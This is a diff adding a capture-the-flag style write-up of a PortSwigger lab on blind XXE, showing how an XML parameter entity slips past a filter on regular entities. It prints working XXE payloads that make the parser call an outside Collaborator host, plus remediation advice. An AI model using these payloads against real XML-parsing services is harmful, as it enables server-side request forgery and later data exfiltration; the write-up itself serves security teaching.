@@ -90,3 +90,107 @@ a1b2c3d4e5f6g7h8i9j0.oastify.com
 
 ## Disclaimer
 This writeup documents an intentionally vulnerable lab on PortSwigger Web Security Academy for educational purposes. Only test systems you own or have explicit written permission to assess.
+
+
+## AFTER(2nd lab which demonstrates the same vulnerability but with XML parsing entities.)
+
+# XXE Injection: Blind XXE with Out-of-Band Interaction via XML Parameter Entities
+
+## Platform
+PortSwigger Web Security Academy
+
+## Difficulty
+Practitioner
+
+## Vulnerability Category
+Blind XML External Entity Injection, Parameter-Entity Bypass (CWE-611)
+
+## Lab Objective
+The "Check stock" feature parses XML input, never displays the result, and now actively **blocks requests containing regular external entities**. Bypass that filter using an XML **parameter entity** instead, forcing the parser to issue a DNS lookup and HTTP request to Burp Collaborator.
+
+## Vulnerability Overview
+This lab builds directly on the previous blind XXE lab, but adds a defensive measure: the application now detects and rejects regular external entity declarations — i.e. anything matching the familiar `<!ENTITY name SYSTEM "...">` pattern used so far throughout this series. A naive assumption would be that this filter closes off XXE entirely. It doesn't, because **XML parameter entities are a structurally distinct construct**, and a filter written to catch one does not automatically catch the other.
+
+Two details distinguish parameter entities from the general entities used previously:
+- **Scope:** a parameter entity can only be referenced *within the DTD itself*, not in the document body — but for a blind, non-data-exfiltrating OOB ping, that's irrelevant, since the goal is simply to trigger resolution, not display a value.
+- **Syntax:** parameter entities are declared with a `%` immediately after `<!ENTITY`, and referenced using `%name;` instead of the usual `&name;`.
+
+```xml
+<!ENTITY % xxe SYSTEM "http://collaborator-domain/">
+%xxe;
+```
+
+If the application's filter was written as a naive pattern match against `<!ENTITY` declarations expecting the ampersand-reference form, or only inspects entities referenced in the document body, the `%`-prefixed declaration and its in-DTD reference can slip through entirely unnoticed, while still being fully valid, resolvable XML.
+
+## Methodology
+1. **Confirm the filter's existence.** Resend the exact payload that worked in the previous blind XXE lab and observe the application now returns an explicit rejection (e.g. "Entities are not allowed for security reasons") instead of processing it.
+2. **Reason about what the filter is actually matching.** A filter blocking "regular" external entities is a strong hint to try the structurally different parameter-entity form instead.
+3. **Construct a parameter-entity payload**, declaring it with `%` and referencing it immediately within the same `DOCTYPE`, rather than inside the document body.
+4. **Generate a fresh Collaborator payload** and inject it as the entity's `SYSTEM` target.
+5. **Poll Collaborator** to confirm the DNS/HTTP interaction fired, proving the filter was bypassed.
+
+---
+
+## Exploitation
+
+**Step 1:** Add a product to the cart and click "Check stock." Intercept the request in Burp Suite:
+
+```http
+POST /product/stock HTTP/1.1
+Host: LAB-ID.web-security-academy.net
+Content-Type: application/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+
+**Step 2:** Send the request to **Repeater** and first confirm the filter is active by resubmitting the prior lab's regular-entity payload:
+
+```xml
+<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://collaborator-domain/" > ]>
+```
+
+The response explicitly rejects it, confirming entity-based filtering is now in place.
+
+**Step 3:** Generate a fresh payload in **Burp > Collaborator client**, then replace the request body with a parameter-entity-based `DOCTYPE`. The parameter entity is declared and immediately referenced within the DTD itself — no reference is needed anywhere in the document body:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockCheck [
+  <!ENTITY % xxe SYSTEM "http://a1b2c3d4e5f6g7h8i9j0.oastify.com">
+  %xxe;
+]>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+
+**Step 4:** Send the request. The application's filter, apparently only inspecting for the standard `&name;`-style entity pattern, does not flag this payload, and the response again looks like an ordinary, unremarkable stock response.
+
+**Step 5:** Return to the **Collaborator client** and click **Poll now**. The log shows a DNS lookup followed by an HTTP request originating from the lab's server, confirming the parser resolved the parameter entity's `SYSTEM` URI.
+
+**Step 6:** This confirmed OOB interaction is sufficient to solve the lab.
+
+**Why it works:** The vulnerability is unchanged from the prior lab — the parser still resolves external entities. What's new is a defensive filter, and defensive filters that pattern-match on syntax rather than on the underlying XML entity *mechanism* are inherently incomplete. By declaring the entity with `%` and referencing it inside the DTD rather than the document body, the payload avoids whatever specific pattern the filter was built to catch, while remaining fully valid XML that the parser processes exactly as intended — the filter's blind spot is the vulnerability here, layered directly on top of the original one.
+
+## Impact
+- **Filter bypass demonstrates insufficient input validation as a standalone XXE defense** — blocking "obvious" entity syntax without disabling the underlying parser feature leaves a structurally equivalent bypass available.
+- **Confirms the XXE primitive remains fully exploitable** despite apparent hardening — an attacker observing a rejected payload should treat that as a prompt to try alternate entity syntax, not as proof the application is safe.
+- **Sets up further data exfiltration techniques** — parameter entities are also the mechanism used in the more advanced labs in this series (malicious external DTDs, error-based exfiltration) to actually extract file contents via OOB channels, not just confirm the vulnerability as done here.
+
+## Remediation
+- **Disable DTD processing and external entity resolution at the parser configuration level**, not via input filtering. This is the only fix that closes off both regular *and* parameter entity vectors simultaneously, since it removes the capability rather than attempting to pattern-match every syntactic variant of it.
+- **Never rely on blocklisting specific entity syntax as a primary defense.** As demonstrated here, a filter targeting one valid XML construct (general entities) can be trivially sidestepped by an equally valid, differently-structured construct (parameter entities) that achieves the same outcome.
+- **Validate XML against a strict, pre-defined schema** that doesn't permit `DOCTYPE` declarations at all for inputs that don't require them — a schema-based allowlist approach is categorically stronger than entity-pattern blocklisting.
+- **Audit any existing "XXE protection" for exactly this gap** — if a codebase has a custom filter rather than a hardened parser configuration, it should be assumed incomplete until proven to block parameter entities, CDATA-based tricks, and other entity variants as well.
+
+## Key Takeaways
+- Input filtering is not a substitute for disabling the vulnerable parser feature — this lab is a direct, practical demonstration of that principle, not just a textbook warning.
+- Parameter entities (`%name;`) and general entities (`&name;`) are distinct XML constructs with different scoping rules, and a defense built around one does not automatically cover the other.
+- When a straightforward payload is explicitly rejected, the next step in a real assessment is to vary the *technique*, not assume the vulnerability is actually fixed — a rejection message is information, not a dead end.
+- This lab is also the first to use a parameter entity purely for triggering OOB interaction rather than for the more advanced out-of-band DTD/exfiltration techniques — understanding this simpler case first is what makes the subsequent, more complex exfiltration labs tractable.
+
+## Tools Used
+- Burp Suite (Proxy, Repeater, Collaborator client)
+- Web browser
+
+## Disclaimer
+This writeup documents an intentionally vulnerable lab on PortSwigger Web Security Academy for educational purposes. Only test systems you own or have explicit written permission to assess.
